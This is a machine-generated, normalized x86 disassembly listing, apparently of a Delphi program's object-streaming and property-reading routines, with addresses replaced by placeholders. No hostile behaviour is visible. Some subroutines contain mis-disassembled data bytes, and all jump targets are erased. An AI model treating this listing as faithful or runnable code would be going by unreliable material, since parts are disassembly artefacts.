mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov si 0xfff2
call sub_403448
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ eax + 0x2c ] ebx
mov eax [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0x2c ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41d9fc
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_41d76c
pop ecx
test al al
jne r-xdata
call sub_403a54
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_403a00
sub_41da20
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41dc41
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x20 ]
lea edx [ ebp - 0x9 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
call sub_41eccc
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_41eccc
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x28 ] eax
xor eax eax
push ebp
push sub_41dc11
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
test [ ebp - 0x9 ] 0x1
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
xor eax eax
push ebp
push sub_41dbcf
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x14 ]
call sub_41d66c
pop ecx
mov eax [ ebp - 0x14 ]
or [ eax + 0x1c ] 0x1
push ebp
mov dl 0x1
mov ax [ r-xdata ]
call sub_41d6e4
pop ecx
test [ ebp - 0x9 ] 0x1
jne r-xdata
push ebp
call sub_41d7cc
pop ecx
push ebp
call sub_41d97c
pop ecx
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push ebp
call sub_41d8dc
pop ecx
mov eax [ ebp - 0x14 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
call sub_403a84
jmp r-xdata
mov eax [ ebp - 0x14 ]
or [ eax + 0x1c ] 0x2
push ebp
mov dl 0x1
mov ax [ r-xdata ]
call sub_41d6e4
pop ecx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x14 ]
and [ eax + 0x1c ] 0xfffd
push ebp
xor edx edx
mov ax [ r-xdata ]
call sub_41d6e4
pop ecx
test [ ebp - 0x9 ] 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x1c ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41dc48
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_403fc0
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_405320
retn
test [ ebp - 0x9 ] 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
mov si 0xfff9
call sub_403448
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_41a294
test eax eax
jge r-xdata
mov eax [ ebp - 0x14 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
push ebp
mov eax [ ebp - 0x14 ]
call sub_41d630
pop ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_41a0dc
jmp r-xdata
push ebp
mov eax [ ebp - 0x14 ]
call sub_41d630
pop ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_41a0dc
sub_41dbd4
push ebp
call sub_41d74c
pop ecx
test al al
je r-xdata
call sub_403a00
call sub_403a54
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
mov eax [ ebp - 0x14 ]
call sub_40324c
sub_41dc5c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41dccc
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov edx [ ebp - 0x4 ]
mov [ edx + 0x30 ] eax
xor eax eax
push ebp
push sub_41dcb7
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41dccc
mov eax [ ebp - 0x4 ]
call sub_41d21c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d360
retn
sub_41dccc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d104
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41e1d4
mov eax [ ebp - 0x4 ]
call sub_41e070
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0xc ] eax
mov eax ebx
mov si 0xfffb
call sub_403448
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2c ] eax
xor eax eax
push ebp
push sub_41dd8e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov si 0xfffc
call sub_403448
mov edi eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28 ] edi
test edi edi
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d104
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41da20
mov eax [ ebp - 0x4 ]
call sub_41e070
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41dd95
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x28 ] edx
retn
sub_41dd9c
push ebx
add esp 0xffffffec
mov ebx eax
mov eax ebx
call sub_41eea8
cmp al 0x5
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41e024
mov [ esp + 0xc ] eax
mov [ esp + 0x10 ] edx
fild [ esp + 0xc ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0xa
mov eax ebx
call sub_41d46c
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
sub_41dde0
push ebx
add esp 0xfffffff4
mov ebx eax
mov eax ebx
call sub_41eea8
cmp al 0xf
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41e024
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] edx
fild [ esp + 0x4 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41d46c
jmp r-xdata
fld [ esp ]
add esp 0xc
pop ebx
retn
sub_41de24
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_41eea8
cmp al 0x10
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41e024
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_41d46c
jmp r-xdata
fild [ esp ]
add esp 0x10
pop ebx
retn
sub_41de74
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_41eea8
cmp al 0x11
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41e024
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_41d46c
jmp r-xdata
fld [ esp ]
add esp 0x10
pop ebx
retn
sub_41deb8
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_41eea8
and eax 0x7f
cmp eax 0xd
ja r-xdata
call sub_41cf44
mov al [ eax + lookup_table_41dedf ]
jmp [ eax * 4 + jump_table_41deed ]
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41d46c
xor ecx ecx
mov cl [ esp ]
mov eax esi
xor edx edx
call sub_40408c
mov eax esi
call j_sub_404468
mov edx eax
xor ecx ecx
mov cl [ esp ]
mov eax ebx
call sub_41d46c
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403ff0
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403ff0
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403ff0
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403ff0
jmp r-xdata
pop edx
pop esi
pop ebx
retn
sub_41dfb8
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_41eea8
sub al 0x2
je r-xdata
lea edx [ esp + 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_41d46c
movsx eax [ esp + 0x4 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop ebx
retn
lea edx [ esp + 0x6 ]
mov ecx 0x2
mov eax ebx
call sub_41d46c
movsx eax [ esp + 0x6 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41d46c
jmp r-xdata
jmp r-xdata
call sub_41cf44
sub_41e024
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_41d448
cmp al 0x13
jne r-xdata
mov eax ebx
call sub_41dfb8
cdq
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax ebx
call sub_41eea8
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_41d46c
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
pop ebx
retn
sub_41e078
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov al [ r-xdata ]
mov [ esi ] al
mov eax ebx
call sub_41d448
and al 0xf0
cmp al 0xf0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_41eea8
and al 0xf
mov [ esi ] al
test [ esi ] 0x2
je r-xdata
mov eax ebx
call sub_41dfb8
mov [ edi ] eax
sub_41e0b5
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffedc
push ebx
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41e1a9
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_403f9c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x8 ]
call sub_404034
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x124 ] eax
mov [ ebp - 0x120 ] 0xb
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x11c ] eax
mov [ ebp - 0x118 ] 0xb
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x124 ]
push eax
push 0x3
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba30
call sub_4039d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e1b0
lea edx [ ebp - 0x104 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_40319c
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_404200
sub_41e1d4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41e3a4
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
push ebp
push j_sub_403818#4
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_41eccc
xor edx edx
push ebp
push j_sub_403818#5
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx 0x1
mov eax [ ebp - 0x8 ]
call sub_40425c
mov esi eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x1
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0xc ]
add eax 0x70
push eax
mov ecx ebx
sub ecx edi
mov edx edi
mov eax [ ebp - 0x8 ]
call sub_4044bc
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + ebx - 0x1 ] 0x2e
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_40348c
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x70 ]
call sub_4166ac
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_40348c
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x70 ]
call sub_4166ac
mov edi eax
test edi edi
jne r-xdata
inc ebx
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x1
mov eax [ ebp - 0xc ]
cmp [ eax + 0x70 ] 0x0
je r-xdata
mov ecx edi
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_41e558
jmp r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
mov eax [ edi ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0xc ]
call sub_41d458
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0xc ]
call sub_41d458
mov eax [ ebp - 0x14 ]
mov edx [ r-xdata ]
call sub_4033d8
test al al
jne r-xdata
mov edx edi
mov eax [ ebp - 0x10 ]
call sub_416754
mov [ ebp - 0x14 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
inc ebx
jmp r-xdata
push ebp
call sub_41e1b8
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e3ab
lea eax [ ebp - 0x8 ]
call sub_403f9c
retn
mov edi ebx
jmp r-xdata
sub_41e35e
add [ eax ] eax
add [ eax ] al
in al dx
jb r-xdata
not [ ebp - 0x2 ]
add [ edx - 0x1d ] ch
inc ecx
add [ ecx - 0xbba743d ] cl
cmp [ eax + 0x78 ] 0x0
je r-xdata
call sub_403a00
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test al al
jne r-xdata
call sub_403a54
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e3ab
lea eax [ ebp - 0x8 ]
call sub_403f9c
retn
sub_41e3b4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ esi ]
mov eax [ eax ]
call sub_419c2c
mov ebx eax
test ebx ebx
je r-xdata
call sub_41cf44
lea edx [ ebp - 0x8 ]
mov eax edi
call ebx
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4167c8
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41e3fc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
push esi
push 0x0
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c9d8
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_41a0dc
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41e43c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
xor eax eax
push ebp
push sub_41e48b
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41f5c0
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4172b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e492
lea eax [ ebp - 0x10 ]
call sub_40f1fc
retn
sub_41e498
push ebp
mov ebp esp
push 0x0
push 0x0
xor eax eax
push ebp
push sub_41e54a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41d448
cmp al 0xd
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41deb8
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c9d8
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_41a0dc
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41eea8
lea eax [ ebp - 0x4 ]
call sub_4059cc
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ ebp - 0x4 ]
call sub_41738c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e551
lea eax [ ebp - 0x8 ]
call sub_403f9c
lea eax [ ebp - 0x4 ]
call sub_4059cc
retn
sub_41e558
push ebp
mov ebp esp
push ecx
mov ecx 0x5
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41e853
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov ebx [ eax ]
xor eax eax
mov al [ ebx ]
cmp eax 0x10
ja r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e85a
lea eax [ ebp - 0x2c ]
mov edx 0x2
call sub_403fc0
lea eax [ ebp - 0x24 ]
call sub_4046a8
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_403fc0
retn
jmp [ eax * 4 + jump_table_41e5e8 ]
mov eax [ rw-data ]
call sub_41cf2c
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_416754
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d448
cmp al 0x7
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d508
xor ecx ecx
mov cl al
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4167c8
jmp r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_41deb8
mov edx [ ebp - 0x1c ]
mov eax ebx
call sub_416648
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4167c8
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41dd9c
add esp 0xfffffff4
fstp [ esp ]
fwait
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_417064
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_41ed08
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_416d64
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_41edc4
mov ecx [ ebp - 0x24 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_416e78
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41ebec
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4167c8
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d448
sub al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d448
cmp al 0xd
jne r-xdata
push ebp
call sub_41e43c
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e024
push edx
push eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_417350
jmp r-xdata
push ebp
call sub_41e498
pop ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_416754
test [ eax + 0x24 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41dfb8
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4167c8
jmp r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_41deb8
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41e3b4
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41eea8
xor ecx ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4167c8
jmp r-xdata
dec al
je r-xdata
lea edx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
call sub_41deb8
mov ecx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41eea8
mov ecx rw-data
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4172f0
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41eea8
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_416754
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_41d560
jmp r-xdata
jmp r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4172f0
jmp r-xdata
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_41deb8
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41e3fc
pop ecx
jmp r-xdata
sub_41e860
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor esi esi
mov eax ebx
mov edx edi
call sub_403ff0
jmp r-xdata
mov eax [ ebx ]
call sub_419dc4
test al al
je r-xdata
inc esi
push ebx
mov [ ebp - 0x10 ] edi
mov [ ebp - 0xc ] 0xb
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x10 ]
mov ecx 0x1
mov eax r-xdata
call sub_408fcc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41e8c0
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41ebdb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41eca8
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_41ebb9
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_41eb7a
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x11 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_41eccc
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_41eccc
mov eax [ ebp - 0x1c ]
call sub_419998
xor ecx ecx
mov dl 0x1
call [ eax + 0x2c ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_41eccc
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x2
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_41eccc
mov eax [ ebp - 0x30 ]
lea edx [ ebp - 0x2c ]
call sub_41e860
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_41eccc
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x18 ] edx
push 0x1
mov eax [ ebp - 0xc ]
call sub_403194
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4196e8
mov edx [ ebp - 0x4 ]
mov [ edx + 0x74 ] eax
xor eax eax
push ebp
push sub_41eb1f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x1c ] edx
call sub_406118
mov eax [ eax + 0x8 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov dl 0x1
